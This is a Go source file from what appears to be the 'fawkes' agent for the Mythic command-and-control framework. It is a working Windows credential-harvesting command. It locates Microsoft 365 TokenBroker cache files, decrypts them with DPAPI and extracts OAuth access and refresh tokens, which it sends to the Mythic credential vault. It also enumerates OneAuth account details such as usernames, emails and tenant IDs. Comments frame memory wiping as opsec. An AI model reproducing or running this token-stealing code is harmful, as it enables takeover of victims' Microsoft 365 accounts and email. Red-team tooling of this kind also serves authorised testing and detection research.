//go:build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// credM365Tokens extracts OAuth/JWT tokens from Microsoft 365 applications:
// - TokenBroker cache (.tbres files) — DPAPI-protected token responses
// - Teams EBWebView cookies — Chromium-pattern AES-GCM encrypted cookies
// - Outlook (new) EBWebView cookies — same pattern
func credM365Tokens(args credHarvestArgs) (result structs.CommandResult) {
	// Recover from panics in DPAPI/SQLite/etc to prevent crashing the agent
	defer func() {
		if r := recover(); r != nil {
			result = structs.CommandResult{
				Output:    fmt.Sprintf("m365-tokens panic: %v", r),
				Status:    "error",
				Completed: true,
			}
		}
	}()

	var sb strings.Builder
	var allCreds []structs.MythicCredential

	sb.WriteString("Microsoft 365 Token Extraction\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// 1. TokenBroker cache
	tbCreds := credTokenBroker(&sb)
	allCreds = append(allCreds, tbCreds...)

	// 2. EBWebView cookies (Teams + Outlook)
	ewCreds := credEBWebViewTokens(&sb)
	allCreds = append(allCreds, ewCreds...)

	// 3. OneAuth account metadata
	credOneAuth(&sb)

	sb.WriteString(fmt.Sprintf("\nTotal tokens extracted: %d\n", len(allCreds)))

	result = structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(allCreds) > 0 {
		result.Credentials = &allCreds
	}
	return result
}

// credTokenBroker parses TokenBroker .tbres files for cached OAuth tokens
func credTokenBroker(sb *strings.Builder) []structs.MythicCredential {
	sb.WriteString("--- TokenBroker Cache ---\n")

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		sb.WriteString("  LOCALAPPDATA not set\n\n")
		return nil
	}

	tbDir := filepath.Join(localAppData, "Microsoft", "TokenBroker", "Cache")
	files, err := filepath.Glob(filepath.Join(tbDir, "*.tbres"))
	if err != nil || len(files) == 0 {
		sb.WriteString("  No .tbres files found\n\n")
		return nil
	}

	sb.WriteString(fmt.Sprintf("  Found %d .tbres files\n", len(files)))

	var creds []structs.MythicCredential
	tokenCount := 0
	skippedCount := 0 // non-TokenResponse or no ResponseBytes
	errorCount := 0
	// Track error categories for diagnostics
	errCategories := map[string]int{}

	for _, f := range files {
		tokens, parseErr := parseTbresFile(f)
		if parseErr != nil {
			errorCount++
			// Categorize the error
			errMsg := parseErr.Error()
			switch {
			case strings.HasPrefix(errMsg, "UTF-16"):
				errCategories["utf16"]++
			case strings.HasPrefix(errMsg, "JSON"):
				errCategories["json"]++
			case strings.HasPrefix(errMsg, "DPAPI"):
				errCategories["dpapi"]++
			case strings.HasPrefix(errMsg, "base64"):
				errCategories["base64"]++
			default:
				errCategories["other"]++
			}
			continue
		}
		if tokens == nil {
			skippedCount++ // not TokenResponse or no ResponseBytes
			continue
		}
		for _, t := range tokens {
			tokenCount++
			// Truncate token for display
			display := t.token
			if len(display) > 80 {
				display = display[:40] + "..." + display[len(display)-20:]
			}
			sb.WriteString(fmt.Sprintf("  [TOKEN] %s\n", filepath.Base(f)))
			sb.WriteString(fmt.Sprintf("    Resource: %s\n", t.resource))
			sb.WriteString(fmt.Sprintf("    ClientID: %s\n", t.clientID))
			sb.WriteString(fmt.Sprintf("    Type: %s\n", t.tokenType))
			sb.WriteString(fmt.Sprintf("    Value: %s\n", display))
			if t.refreshToken != "" {
				refreshDisplay := t.refreshToken
				if len(refreshDisplay) > 80 {
					refreshDisplay = refreshDisplay[:40] + "..." + refreshDisplay[len(refreshDisplay)-20:]
				}
				sb.WriteString(fmt.Sprintf("    Refresh: %s\n", refreshDisplay))
			}

			// Report access token to Mythic vault
			comment := fmt.Sprintf("TokenBroker %s", t.tokenType)
			if t.resource != "" {
				comment += " for " + t.resource
			}
			creds = append(creds, structs.MythicCredential{
				CredentialType: "token",
				Realm:          t.resource,
				Account:        t.clientID,
				Credential:     t.token,
				Comment:        comment,
			})

			// Report refresh token separately if present
			if t.refreshToken != "" {
				creds = append(creds, structs.MythicCredential{
					CredentialType: "token",
					Realm:          t.resource,
					Account:        t.clientID,
					Credential:     t.refreshToken,
					Comment:        fmt.Sprintf("TokenBroker refresh_token for %s", t.resource),
				})
			}

			// Zero sensitive strings after use
			structs.ZeroString(&t.token)
			structs.ZeroString(&t.refreshToken)
		}
	}

	sb.WriteString(fmt.Sprintf("  Extracted %d tokens (%d metadata/skipped, %d errors)\n", tokenCount, skippedCount, errorCount))
	if errorCount > 0 {
		for cat, count := range errCategories {
			sb.WriteString(fmt.Sprintf("    %s: %d\n", cat, count))
		}
	}
	sb.WriteString("\n")
	return creds
}

// parseTbresFile reads a UTF-16LE .tbres file, decrypts DPAPI-protected fields,
// and extracts token values
func parseTbresFile(path string) ([]extractedToken, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	defer structs.ZeroBytes(raw) // opsec: clear raw tbres token cache from memory

	// Convert UTF-16LE to UTF-8
	jsonStr, err := utf16LEToUTF8(raw)
	if err != nil {
		return nil, fmt.Errorf("UTF-16 decode: %w", err)
	}

	// Trim any remaining null characters (embedded or trailing) that break JSON parsing
	jsonStr = strings.TrimRight(jsonStr, "\x00")

	var obj tbresObject
	if err := json.Unmarshal([]byte(jsonStr), &obj); err != nil {
		return nil, fmt.Errorf("JSON parse: %w", err)
	}

	// Only process TokenResponse objects
	if obj.TBDataStoreObject.Header.ObjectType != "TokenResponse" {
		return nil, nil
	}

	// Extract ResponseBytes (DPAPI-protected)
	respBytes, ok := obj.TBDataStoreObject.ObjectData.SystemDefinedProperties["ResponseBytes"]
	valueStr := tbresValueString(respBytes)
	if !ok || valueStr == "" {
		return nil, nil
	}

	decoded, err := base64.StdEncoding.DecodeString(valueStr)
	if err != nil || len(decoded) == 0 {
		return nil, fmt.Errorf("base64 decode: empty or invalid")
	}

	if !respBytes.IsProtected {
		// Not encrypted, try parsing directly
		return parseTokenResponseJSON(decoded)
	}

	// DPAPI decrypt — guard against empty/tiny data that would panic
	if len(decoded) < 8 {
		return nil, fmt.Errorf("DPAPI data too short (%d bytes)", len(decoded))
	}
	decrypted, err := dpapiDecrypt(decoded)
	if err != nil {
		return nil, fmt.Errorf("DPAPI: %w", err)
	}
	defer structs.ZeroBytes(decrypted)

	if len(decrypted) == 0 {
		return nil, nil
	}

	return parseTokenResponseJSON(decrypted)
}

// credOneAuth enumerates OneAuth account metadata (not DPAPI-protected)
func credOneAuth(sb *strings.Builder) {
	sb.WriteString("--- OneAuth Account Metadata ---\n")

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		sb.WriteString("  LOCALAPPDATA not set\n\n")
		return
	}

	oneAuthDir := filepath.Join(localAppData, "Microsoft", "OneAuth", "accounts")
	entries, err := os.ReadDir(oneAuthDir)
	if err != nil {
		sb.WriteString("  No OneAuth accounts found\n\n")
		return
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		path := filepath.Join(oneAuthDir, entry.Name())
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		defer structs.ZeroBytes(data) // opsec: clear OneAuth account metadata from memory

		// Try to parse as JSON for user-friendly display
		var acct map[string]interface{}
		if err := json.Unmarshal(data, &acct); err == nil {
			// Extract useful fields
			for _, key := range []string{"username", "email", "display_name", "upn", "tenant_id", "environment"} {
				if v, ok := acct[key]; ok {
					sb.WriteString(fmt.Sprintf("  %s: %v\n", key, v))
				}
			}
		} else {
			// Show raw content (truncated)
			content := string(data)
			if len(content) > 500 {
				content = content[:500] + "..."
			}
			sb.WriteString(fmt.Sprintf("  [%s] %s\n", entry.Name(), content))
		}
	}
	sb.WriteString("\n")
}
